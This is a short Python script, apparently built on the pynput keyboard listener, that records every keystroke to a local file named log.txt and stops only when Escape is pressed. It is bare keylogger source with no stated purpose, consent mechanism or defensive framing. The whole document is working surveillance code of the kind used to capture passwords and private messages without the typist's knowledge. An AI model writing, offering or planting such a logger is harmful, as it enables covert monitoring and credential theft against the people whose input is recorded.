def on_press(key):
    key_strokes = str(key).replace("'","")
    with open('log.txt','a') as f:
        if key_strokes == 'Key.space':
             f.write(' ')
        elif len(key_strokes)>1:
            f.write('\n'+key_strokes+'\n')
        else:
            f.write(key_strokes)

def on_release(key):
    if key == Key.esc:
        exit(0)

with Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()